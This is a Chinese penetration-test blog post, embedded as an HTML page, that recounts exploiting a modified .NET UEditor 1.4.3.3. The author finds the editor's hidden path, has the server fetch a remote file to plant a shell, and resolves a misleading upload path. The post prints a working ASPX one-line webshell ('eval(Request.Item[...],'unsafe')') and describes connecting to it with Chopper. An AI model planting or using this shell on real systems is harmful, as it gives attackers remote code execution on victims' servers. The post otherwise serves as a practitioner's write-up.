@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。
+网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。
+翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。
+'>
+<title>佛学的魔改.net Ueditor</title>
+
+<link rel='canonical' href='https://360rce.github.io/p/ym1ku8fe/'>
+
+<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='佛学的魔改.net Ueditor'>
+<meta property='og:description' content='前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。
+网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。
+翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。
+'>
+<meta property='og:url' content='https://360rce.github.io/p/ym1ku8fe/'>
+<meta property='og:site_name' content='iceH&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='渗透实战' /><meta property='article:tag' content='原创文章' /><meta property='article:published_time' content='2019-12-11T09:19:25&#43;00:00'/><meta property='article:modified_time' content='2019-12-11T09:19:25&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png' />
+<meta name="twitter:title" content="佛学的魔改.net Ueditor">
+<meta name="twitter:description" content="前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。
+网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。
+翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。
+"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<style>
+    :root {
+     
+    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
+    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
+    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
+  }
+</style>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+         document.head.appendChild(customFont);
+}());
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended">
+
+
+        <aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hue92896558ee730c67dc59b841139d134_363585_300x0_resize_box_3.png" width="300"
+                            height="333" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">iceH&#39;s Blog</a></h1>
+            <h2 class="site-description">一条啥也不会的咸鱼！</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M456 32h-304C121.1 32 96 57.13 96 88v320c0 13.22-10.77 24-24 24S48 421.2 48 408V112c0-13.25-10.75-24-24-24S0 98.75 0 112v296C0 447.7 32.3 480 72 480h352c48.53 0 88-39.47 88-88v-304C512 57.13 486.9 32 456 32zM464 392c0 22.06-17.94 40-40 40H139.9C142.5 424.5 144 416.4 144 408v-320c0-4.406 3.594-8 8-8h304c4.406 0 8 3.594 8 8V392zM264 272h-64C186.8 272 176 282.8 176 296S186.8 320 200 320h64C277.3 320 288 309.3 288 296S277.3 272 264 272zM408 272h-64C330.8 272 320 282.8 320 296S330.8 320 344 320h64c13.25 0 24-10.75 24-24S421.3 272 408 272zM264 352h-64c-13.25 0-24 10.75-24 24s10.75 24 24 24h64c13.25 0 24-10.75 24-24S277.3 352 264 352zM408 352h-64C330.8 352 320 362.8 320 376s10.75 24 24 24h64c13.25 0 24-10.75 24-24S421.3 352 408 352zM400 112h-192c-17.67 0-32 14.33-32 32v64c0 17.67 14.33 32 32 32h192c17.67 0 32-14.33 32-32v-64C432 126.3 417.7 112 400 112z"></path></svg>
+                
+                <span>文章</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 32H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h448c35.35 0 64-28.65 64-64V96C576 60.65 547.3 32 512 32zM176 128c35.35 0 64 28.65 64 64s-28.65 64-64 64s-64-28.65-64-64S140.7 128 176 128zM272 384h-192C71.16 384 64 376.8 64 368C64 323.8 99.82 288 144 288h64c44.18 0 80 35.82 80 80C288 376.8 280.8 384 272 384zM496 320h-128C359.2 320 352 312.8 352 304S359.2 288 368 288h128C504.8 288 512 295.2 512 304S504.8 320 496 320zM496 256h-128C359.2 256 352 248.8 352 240S359.2 224 368 224h128C504.8 224 512 231.2 512 240S504.8 256 496 256zM496 192h-128C359.2 192 352 184.8 352 176S359.2 160 368 160h128C504.8 160 512 167.2 512 176S504.8 192 496 192z"></path></svg>
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M464 96h-192l-64-64h-160C21.5 32 0 53.5 0 80V160h512V144C512 117.5 490.5 96 464 96zM0 432C0 458.5 21.5 480 48 480h416c26.5 0 48-21.5 48-48V192H0V432z"></path></svg>
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M500.3 443.7l-119.7-119.7c27.22-40.41 40.65-90.9 33.46-144.7C401.8 87.79 326.8 13.32 235.2 1.723C99.01-15.51-15.51 99.01 1.724 235.2c11.6 91.64 86.08 166.7 177.6 178.9c53.8 7.189 104.3-6.236 144.7-33.46l119.7 119.7c15.62 15.62 40.95 15.62 56.57 0C515.9 484.7 515.9 459.3 500.3 443.7zM79.1 208c0-70.58 57.42-128 128-128s128 57.42 128 128c0 70.58-57.42 128-128 128S79.1 278.6 79.1 208z"></path></svg>
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" fill="#BDBDBF"><path d="M352 128c0 70.7-57.3 128-128 128s-128-57.3-128-128S153.3 0 224 0s128 57.3 128 128zM0 482.3C0 383.8 79.8 304 178.3 304h91.4C368.2 304 448 383.8 448 482.3c0 16.4-13.3 29.7-29.7 29.7H29.7C13.3 512 0 498.7 0 482.3zM609.3 512H471.4c5.4-9.4 8.6-20.3 8.6-32v-8c0-60.7-27.1-115.2-69.8-151.8c2.4-.1 4.7-.2 7.1-.2h61.4C567.8 320 640 392.2 640 481.3c0 17-13.8 30.7-30.7 30.7zM432 256c-31 0-59-12.6-79.3-32.9C372.4 196.5 384 163.6 384 128c0-26.8-6.6-52.1-18.3-74.3C384.3 40.1 407.2 32 432 32c61.9 0 112 50.1 112 112s-50.1 112-112 112z"></path></svg>
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 160C202.9 160 160 202.9 160 256s42.92 96 96 96c53.08 0 96-42.92 96-96S309.1 160 256 160zM256 288C238.3 288 224 273.7 224 256s14.33-32 32-32c17.67 0 32 14.33 32 32S273.7 288 256 288zM256 0c-141.4 0-256 114.6-256 256s114.6 256 256 256c141.4 0 256-114.6 256-256S397.4 0 256 0zM256 384c-70.75 0-128-57.25-128-128s57.25-128 128-128s128 57.25 128 128S326.8 384 256 384z"></path></svg>
+					
+                    
+                    
+                    <span>暗色</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ym1ku8fe/">
+                
+                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png" loading="lazy" alt="Featured image of post 佛学的魔改.net Ueditor" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%8D%97%E9%A3%8E%E7%9F%A5%E6%88%91%E6%84%8F/" >
+                南风知我意
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ym1ku8fe/">佛学的魔改.net Ueditor</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
+                
+                <time class="article-time--published">2019/12/11</time>
+            </div>
+        
+
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
+                
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p>
+<p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p>
+<p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p>
+<p><img src="/p/ym1ku8fe/01.jpg"
+	width="1900"
+	height="771"
+	srcset="/p/ym1ku8fe/01_hudc845da5e9d520fc787f37c503f66ff3_92914_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/01_hudc845da5e9d520fc787f37c503f66ff3_92914_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="591px"
+	
+></p>
+<p>通过fd抓包获取到编辑器路径为：</p>
+<p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p>
+<p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p>
+<p><img src="/p/ym1ku8fe/02.jpg"
+	width="998"
+	height="327"
+	srcset="/p/ym1ku8fe/02_hu0c29d803a40c547f4df5113b571d2af3_17044_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/02_hu0c29d803a40c547f4df5113b571d2af3_17044_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="305"
+		data-flex-basis="732px"
+	
+></p>
+<p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p>
+<p><img src="/p/ym1ku8fe/03.jpg"
+	width="1784"
+	height="666"
+	srcset="/p/ym1ku8fe/03_hu6b94eb4904a07264c944bfce3acd8afe_93230_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/03_hu6b94eb4904a07264c944bfce3acd8afe_93230_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="642px"
+	
+></p>
+<p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p>
+<p><img src="/p/ym1ku8fe/04.jpg"
+	width="1191"
+	height="575"
+	srcset="/p/ym1ku8fe/04_hu8027819bf9a869d2ed5d00a9e68bf9ce_79605_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/04_hu8027819bf9a869d2ed5d00a9e68bf9ce_79605_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="497px"
+	
+></p>
+<p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p>
+<p><img src="/p/ym1ku8fe/05.jpg"
+	width="1300"
+	height="507"
+	srcset="/p/ym1ku8fe/05_hu4dda13b76e39b4fbae2a0bc915c1dacd_35601_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/05_hu4dda13b76e39b4fbae2a0bc915c1dacd_35601_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="615px"
+	
+></p>
+<p>打开这个js文件，找到了ueditor的真实路径。</p>
+<p><img src="/p/ym1ku8fe/06.jpg"
+	width="1478"
+	height="568"
+	srcset="/p/ym1ku8fe/06_hu49eac7373cd60b2c12702b1bd131db6f_90250_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/06_hu49eac7373cd60b2c12702b1bd131db6f_90250_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="624px"
+	
+></p>
+<p>但是去访问的时候，发现地址无法访问。</p>
+<p><img src="/p/ym1ku8fe/07.jpg"
+	width="985"
+	height="721"
+	srcset="/p/ym1ku8fe/07_hu6381e0b3bd98b6b274924acb259b18c8_17729_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/07_hu6381e0b3bd98b6b274924acb259b18c8_17729_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="327px"
+	
+></p>
+<p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p>
+<p><img src="/p/ym1ku8fe/08.jpg"
+	width="1909"
+	height="784"
+	srcset="/p/ym1ku8fe/08_huc9d8e90050d1a8584532862197f417df_121149_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/08_huc9d8e90050d1a8584532862197f417df_121149_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="584px"
+	
+></p>
+<p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p>
+<p><img src="/p/ym1ku8fe/09.jpg"
+	width="1012"
+	height="225"
+	srcset="/p/ym1ku8fe/09_hua6af383afdaedc76b8a3fe6704c7b7f8_7776_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/09_hua6af383afdaedc76b8a3fe6704c7b7f8_7776_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="449"
+		data-flex-basis="1079px"
+	
+></p>
+<p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p>
+<p><img src="/p/ym1ku8fe/10.jpg"
+	width="648"
+	height="197"
+	srcset="/p/ym1ku8fe/10_hu60f42e808363990415a577c829ddd2e8_6448_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/10_hu60f42e808363990415a577c829ddd2e8_6448_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="789px"
+	
+></p>
+<p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p>
+<p><img src="/p/ym1ku8fe/11.jpg"
+	width="1075"
+	height="375"
+	srcset="/p/ym1ku8fe/11_hu38e59862328b04bfeb253e7c24e2fe16_12775_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/11_hu38e59862328b04bfeb253e7c24e2fe16_12775_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="688px"
+	
+></p>
+<p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p>
+<p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p>
+<p><img src="/p/ym1ku8fe/12.jpg"
+	width="768"
+	height="979"
+	srcset="/p/ym1ku8fe/12_hud9f5abfcc3bd844df30f34e9839c1555_32129_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/12_hud9f5abfcc3bd844df30f34e9839c1555_32129_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="78"
+		data-flex-basis="188px"
+	
+></p>
+<p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p>
+<p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p>
+<p><img src="/p/ym1ku8fe/13.jpg"
+	width="980"
+	height="350"
+	srcset="/p/ym1ku8fe/13_hu420f54368f5bff969300e3871c95c34b_12951_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/13_hu420f54368f5bff969300e3871c95c34b_12951_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="672px"
+	
+></p>
+<p>仔细一看，第一次返回的路径中多了&rsquo;/&rsquo;，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。</p>
+<p><img src="/p/ym1ku8fe/14.jpg"
+	width="668"
+	height="61"
+	srcset="/p/ym1ku8fe/14_hufc513a1060b63e5b4bb22e26607102ba_3521_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/14_hufc513a1060b63e5b4bb22e26607102ba_3521_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1095"
+		data-flex-basis="2628px"
+	
+></p>
+<p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p>
+<p><img src="/p/ym1ku8fe/15.jpg"
+	width="969"
+	height="397"
+	srcset="/p/ym1ku8fe/15_hu136b7bef6cad7f1f66143dac2c80eee1_113342_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/15_hu136b7bef6cad7f1f66143dac2c80eee1_113342_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="585px"
+	
+></p>
+<p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;../../../../../../../App_Themes/default/default.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;../../../../../../../App_Themes/green/EnStyle.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;../../../../../../../App_Themes/green/Style.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span> <span class="na">runat</span><span class="o">=</span><span class="s">&#34;server&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;../../../../../../../App_Themes/default/default.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;../../../../../../../App_Themes/green/EnStyle.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;../../../../../../../App_Themes/green/Style.css&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="p">/&gt;&lt;</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>%@ Page Language=&#34;Jscript&#34;%&gt;<span class="err">&lt;</span>%eval(Request.Item[&#34;g&#34;],&#34;unsafe&#34;);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传成功后，菜刀连接成功。</p>
+<p><img src="/p/ym1ku8fe/16.jpg"
+	width="784"
+	height="534"
+	srcset="/p/ym1ku8fe/16_hud2ba2eb9b64e1ef6708b5692cf92864c_18732_480x0_resize_q75_box.jpg 480w, /p/ym1ku8fe/16_hud2ba2eb9b64e1ef6708b5692cf92864c_18732_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="佛学的魔改Ueditor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="352px"
+	
+></p>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a>
+        
+            <a href="/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/">原创文章</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/iqi0ucr4/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg" loading="lazy" data-key="iqi0ucr4" data-hash="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">记一次任意文件上传</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/3dvjkhwx/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg" loading="lazy" data-key="3dvjkhwx" data-hash="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">记一个奇葩的上传点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/mwcslpwe/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg" loading="lazy" data-key="mwcslpwe" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">一个项目中遇到的奇葩站点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xaef7i9f/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" data-key="xaef7i9f" data-hash="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">意外性的发现一套cms的注入漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/6gkds72h/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/l8/wallhaven-l8d8my.png" loading="lazy" data-key="6gkds72h" data-hash="https://w.wallhaven.cc/full/l8/wallhaven-l8d8my.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">毫无技术含量的一次渗透</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="360rce/blog-comment"
+        issue-term="pathname"
